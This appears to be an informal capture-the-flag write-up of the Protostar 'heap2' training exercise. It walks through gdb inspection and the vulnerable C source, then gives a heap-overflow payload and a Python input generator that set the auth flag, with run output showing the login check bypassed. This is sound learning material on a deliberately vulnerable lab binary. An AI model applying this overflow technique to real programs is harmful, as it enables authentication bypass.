### S0lv3d by H4yicl3

link https://exploit-exercises.com/protostar/heap2/

try to analysis it with gdb

```
pdis main
0x08048689 <+60>:    call   0x8048480 <printf@plt>
b *main+60


```

the struct look like
```c
struct auth {
  char name[32];
  int auth;
};
if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) { #overflow it with the number not 0
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
```

so we need overflow the auth to get login
the heap segment look like
```
x/40wx 0x0804b000 
0x804b000:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804b010:      0x00000000      0x00020ff1      0x00000000      0x00000000
0x804b020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804b030:      0x00000000      0x00000000      0x00000000      0x00000000
```

but we can't overflow this !! be cause the check cancel us
```c
if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
```

so another way is use service

```c
if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);	// strdup function make we can write any thing so we can overflow the auth of auth
      }
```

the exploit look like
```
auth hayicle

service ="A"*24+"\x01"
```

the python code look like
```python
auth ="auth hayicle"
padding ="A"*24+"\x01"
service ="service "+padding
login ="login"

print auth
print service
print login
```

try to run this
```
hayicle@ubuntu:~/ctf/protostar/heap$ ./heap2 <input
[ auth = (nil), service = (nil) ]
[ auth = 0x804b008, service = (nil) ]
[ auth = 0x804b008, service = 0x804b018 ]
you have logged in already!
[ auth = 0x804b008, service = 0x804b018 ]
```

ok !! g00d lost :))
